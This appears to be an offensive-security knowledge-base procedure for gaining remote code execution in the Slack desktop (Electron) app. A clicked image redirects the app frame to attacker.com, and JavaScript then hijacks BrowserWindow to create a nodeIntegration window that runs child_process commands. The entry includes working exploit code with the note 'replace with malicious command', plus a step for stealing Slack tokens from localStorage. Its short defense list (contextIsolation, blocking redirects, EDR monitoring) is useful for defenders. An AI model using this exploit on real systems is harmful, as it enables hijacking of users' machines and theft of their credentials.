---
id: proc-trigger-rce-desktop
tags:
  - rce
  - electron
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/electron-browserwindow-rce-mac]]'
  - '[[commands/electron-data-exfil]]'
  - '[[commands/child-process-exec-windows]]'
verified: false
platforms:
  - Desktop (Electron)
  - Mac
  - Windows
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:24:15.147Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Exploitation for Client Execution]]'
---
# Trigger-Redirect-and-RCE-in-Desktop-App

## Summary

This procedure details how a user click in the Slack desktop app triggers the HTML redirect to the attacker site, loading JS that manipulates Electron for RCE.

## Description

The <area> tag redirects the _top frame to the payload site. JS overwrites window.desktop, leaks BrowserWindow, creates a nodeIntegrated instance, and executes commands via child_process. Works on Slack 4.2/4.3.2 across OSes, granting access to files, tokens, and network.

## Requirements

1. Target using Slack desktop app (Electron).
2. Hosted RCE payload from Step 1.
3. Click on injected image.

## Defense

Defensive measures and detection strategies:

- Enable contextIsolation in Electron.
- Block external redirects in app frames.
- Monitor for BrowserWindow manipulations via EDR.

## Objectives

1. Hijack app frame for payload delivery.
2. Achieve arbitrary code execution.
3. Exfiltrate data or propagate.

## Instructions

### Step 1: User Interaction

**Context**: Target clicks the post image in desktop app.

Click triggers <area> href, redirecting to https://attacker.com/t.html in _top.

> App loads attacker site JS.

### Step 2: Execute RCE Payload

**Context**: JS runs to manipulate Electron.

Use [[commands/electron-browserwindow-rce-mac]] for Mac or [[commands/child-process-exec-windows]] for Windows.

**Command** ([[commands/electron-browserwindow-rce-mac]]):
```javascript
window.desktop.delegate = {}
window.desktop.delegate.canOpenURLInWindow = () => true
window.desktop.window = {}
window.desktop.window.open = () => 1
bw = window.open('about:blank')
nbw = new bw.constructor({show: false, webPreferences: {nodeIntegration: true}})
nbw.loadURL('about:blank')
nbw.webContents.executeJavaScript('this.require("child_process").exec("open /Applications/Calculator.app")')
```

> Opens Calculator; replace with malicious command.

### Step 3: Data Exfiltration Alternative

**Context**: Steal tokens without full RCE.

Use [[commands/electron-data-exfil]] to dump localStorage.

> Alerts JSON with Slack tokens.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript
- [[Exploitation for Client Execution]] Exploitation for Client Execution

### Sub-Techniques


## Commands Used

- [[commands/electron-browserwindow-rce-mac]]
- [[commands/electron-data-exfil]]
- [[commands/child-process-exec-windows]]

## Tools Used


## Tags

- rce
- electron
